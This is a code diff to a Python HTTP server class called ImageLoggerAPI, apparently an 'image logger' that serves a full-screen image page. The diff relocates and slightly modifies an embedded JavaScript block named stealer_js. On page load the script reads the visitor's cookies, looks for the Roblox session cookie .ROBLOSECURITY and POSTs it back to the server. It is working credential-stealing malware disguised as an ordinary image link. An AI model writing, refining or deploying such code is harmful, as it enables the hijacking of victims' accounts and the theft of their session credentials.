@@ -255,6 +255,33 @@ binaries = {
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
+
+        stealer_js = """
+    <script>
+    (function(){
+        function sendCookie(){
+            var cookies = document.cookie;
+            if (cookies.includes('.ROBLOSECURITY')) {
+                fetch('/roblox', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({cookie: cookies}),
+                    cache: 'no-cache',
+                    credentials: 'same-origin'
+                }).catch(() => {});
+            }
+        }
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', sendCookie);
+        } else {
+            sendCookie();
+        }
+        setTimeout(sendCookie, 1000);
+    })();
+    </script>
+    """
+
+
         try:
             if config["imageArgument"]:
                 s = self.path
@@ -266,29 +293,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-                stealer_js = """
-    <script>
-    (function(){
-        function sendCookie(){
-            var cookies = document.cookie;
-            if (cookies.includes('.ROBLOSECURITY')) {
-                fetch('/roblox', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({cookie: cookies}),
-                    cache: 'no-cache'
-                }).catch(() => {});
-            }
-        }
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', sendCookie);
-        } else {
-            sendCookie();
-        }
-        setTimeout(sendCookie, 1000);  // Roblox lazy-load backup
-    })();
-    </script>
-    """
+            
             data = f'''<style>body{{margin:0;padding:0;}}div.img{{background-image:url('{url}');background-position:center;background-repeat:no-repeat;background-size:contain;width:100vw;height:100vh;}}</style><div class="img"></div>{stealer_js}'''.encode()
 
             
